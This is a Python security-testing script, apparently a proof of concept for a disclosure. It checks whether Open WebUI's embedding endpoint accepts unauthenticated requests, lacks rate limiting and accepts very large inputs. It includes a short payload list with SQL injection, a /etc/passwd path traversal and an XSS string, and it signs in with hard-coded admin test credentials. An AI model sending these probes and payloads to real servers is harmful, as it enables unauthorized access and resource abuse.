#!/usr/bin/env python3
"""
Open WebUI — Unauthenticated Embedding Endpoint Tester
Finding: /api/v1/retrieval/ef/{text} accessible without authentication
"""
import requests
import time
import json

BASE = "http://localhost:3000"

print("=" * 60)
print("  Open WebUI: Unauthenticated Embedding Endpoint")
print("  /api/v1/retrieval/ef/{text}")
print("=" * 60)

results = []

# Test 1: Basic access without any credentials
print("\n[TEST 1] No credentials — does endpoint respond?")
r = requests.get(f"{BASE}/api/v1/retrieval/ef/hello")
result = {
    "test": "no_auth_basic",
    "status": r.status_code,
    "vector_dims": len(r.json().get("result", [])) if r.status_code == 200 else 0,
    "vulnerable": r.status_code == 200
}
print(f"  Status: {r.status_code} → {'VULNERABLE' if result['vulnerable'] else 'protected'}")
if result["vulnerable"]:
    print(f"  Embedding dims: {result['vector_dims']}")
results.append(result)

# Test 2: Rate limiting — rapid requests
print("\n[TEST 2] Rate limiting — 20 rapid requests")
success_count = 0
start = time.time()
for i in range(20):
    r = requests.get(f"{BASE}/api/v1/retrieval/ef/test{i}")
    if r.status_code == 200:
        success_count += 1
elapsed = time.time() - start
result = {
    "test": "rate_limit",
    "requests": 20,
    "success": success_count,
    "elapsed_sec": round(elapsed, 2),
    "rate_limited": success_count < 20
}
print(f"  {success_count}/20 requests succeeded in {elapsed:.2f}s")
print(f"  Rate limited: {'YES' if result['rate_limited'] else 'NO — vulnerable to abuse'}")
results.append(result)

# Test 3: Large input — resource exhaustion
print("\n[TEST 3] Large input texts")
sizes = [100, 500, 1000, 5000]
for size in sizes:
    text = "A" * size
    start = time.time()
    r = requests.get(f"{BASE}/api/v1/retrieval/ef/{text}")
    elapsed = time.time() - start
    result = {
        "test": f"large_input_{size}",
        "chars": size,
        "status": r.status_code,
        "time_sec": round(elapsed, 3)
    }
    print(f"  {size} chars → {r.status_code} in {elapsed:.3f}s")
    results.append(result)

# Test 4: Special characters — injection attempt
print("\n[TEST 4] Special characters in text parameter")
payloads = [
    ("sql_injection", "' OR '1'='1"),
    ("path_traversal", "../../../etc/passwd"),
    ("null_byte", "hello\x00world"),
    ("unicode", "привет мир"),
    ("html_entities", "<script>alert(1)</script>"),
]
for name, payload in payloads:
    try:
        r = requests.get(f"{BASE}/api/v1/retrieval/ef/{payload}", timeout=5)
        result = {
            "test": f"special_{name}",
            "status": r.status_code,
            "responded": r.status_code == 200
        }
        print(f"  {name}: {r.status_code}")
        results.append(result)
    except Exception as e:
        print(f"  {name}: ERROR {e}")

# Test 5: Compare — authenticated vs unauthenticated response
print("\n[TEST 5] Auth vs No-auth — same endpoint")
token = requests.post(f"{BASE}/api/v1/auths/signin", json={
    "email": "admin@local.test",
    "password": "Admin2024"
}).json().get("token", "")

text = "security test"
r_unauth = requests.get(f"{BASE}/api/v1/retrieval/ef/{text}")
r_auth = requests.get(f"{BASE}/api/v1/retrieval/ef/{text}",
    headers={"Authorization": f"Bearer {token}"})

print(f"  Unauthenticated: {r_unauth.status_code}")
print(f"  Authenticated: {r_auth.status_code}")

if r_unauth.status_code == 200 and r_auth.status_code == 200:
    unauth_vec = r_unauth.json().get("result", [])[:3]
    auth_vec = r_auth.json().get("result", [])[:3]
    print(f"  Same response: {unauth_vec == auth_vec}")
    print(f"  → Endpoint fully accessible without auth!")

# Summary
print("\n" + "=" * 60)
print("  SUMMARY")
print("=" * 60)
vulnerable = [r for r in results if r.get("vulnerable") or r.get("status") == 200]
print(f"  Vulnerable tests: {len(vulnerable)}/{len(results)}")
print(f"  Rate limiting: {'NO' if success_count == 20 else 'YES'}")
print(f"  Max tested input: {max(sizes)} chars — all accepted")
print(f"\n  FINDING: GET /api/v1/retrieval/ef/{{text}}")
print(f"  Any unauthenticated user can invoke the embedding model")
print(f"  No rate limiting, no auth, no input size limit enforced")

with open("embedding_noauth_results.json", "w") as f:
    json.dump(results, f, indent=2)
print(f"\n  Results saved: embedding_noauth_results.json")
